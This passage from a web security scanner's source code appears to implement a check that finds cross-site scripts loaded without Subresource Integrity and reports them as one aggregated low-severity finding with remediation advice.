        const key = abs.toString();
        const cur = seenScripts.get(key);
        if (cur) { if (!cur.onPages.includes(p.url)) cur.onPages.push(p.url); }
        else seenScripts.set(key, { onPages: [p.url], integrity: !!attrs["integrity"] });
      }
    }

    // Aggregate into ONE finding — emitting one LOW per script floods the report
    // (a normal site pulls dozens of cross-site assets).
    const thirdParty = [...seenScripts.entries()].filter(([, info]) => !info.integrity);
    if (thirdParty.length) {
      const hosts = [...new Set(thirdParty.map(([src]) => { try { return new URL(src).host; } catch { return src; } }))];
      await ctx.emit(draft({
        severity: "low", confidence: "high",
        title: `${thirdParty.length} cross-site script(s) loaded without Subresource Integrity`,
        description: `Scripts from other sites are loaded without an \`integrity=\` attribute. If any of these hosts (${hosts.slice(0, 5).join(", ")}${hosts.length > 5 ? ", …" : ""}) is compromised, attackers can serve modified JS to your users. Same-site (own-CDN) scripts are excluded.`,
        ruleId: "sri/missing",
        cwe: ["CWE-353", "CWE-1357"], owasp: ["A08:2021"],
        location: { url: thirdParty[0][1].onPages[0], snippet: thirdParty[0][0] },
        evidence: { count: thirdParty.length, hosts, scripts: thirdParty.slice(0, 30).map(([src, info]) => ({ src, onPages: info.onPages.slice(0, 3) })) },
        remediation: "Add `integrity=\"sha384-…\" crossorigin=\"anonymous\"` to each cross-site <script>, or self-host the asset.",
        references: ["https://developer.mozilla.org/docs/Web/Security/Subresource_Integrity"],
      }));
    }
    await ctx.progress(1, `${pagesChecked} pages, ${thirdParty.length} cross-site scripts`);
  },
};
